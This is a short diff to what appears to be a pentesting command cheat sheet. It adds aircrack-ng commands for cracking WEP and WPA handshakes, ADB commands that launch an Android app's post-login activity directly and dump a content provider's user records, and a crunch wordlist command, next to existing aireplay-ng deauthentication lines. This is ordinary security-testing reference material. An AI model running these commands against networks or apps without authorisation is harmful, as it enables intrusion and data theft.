@@ -423,6 +423,10 @@ airodump-ng wlan0mon
 
 airodump-ng --channel 8 --bssid 11:22:33:44:55:66 --write airodump wlan0mon 
 
+aircrack-ng wepcrack01.cap
+
+aircrack-ng handshake-file-01.cap -w testwordlist
+
 aireplay-ng --deauth 5 -a 11:22:33:44:55:66 wlan0mon
 
 aireplay-ng --deauth 5 -a 11:22:33:44:55:66 -c 55:44:88:66:11:22 wlan0mon
@@ -434,6 +438,16 @@ ifconfig wlan0 down
 ifconfig wlan0 mode monitor
 
 ifconfig wlan0 up
+
+## ADB ##
+
+am start -n com.android.asdad/.PostLogin
+
+content query --uri content://com.android.asdasd.TrackUserContentProvider/trackusers
+
+## crunch ##
+
+crunch 8 9 xy123 -o testwordlists
 
 
 
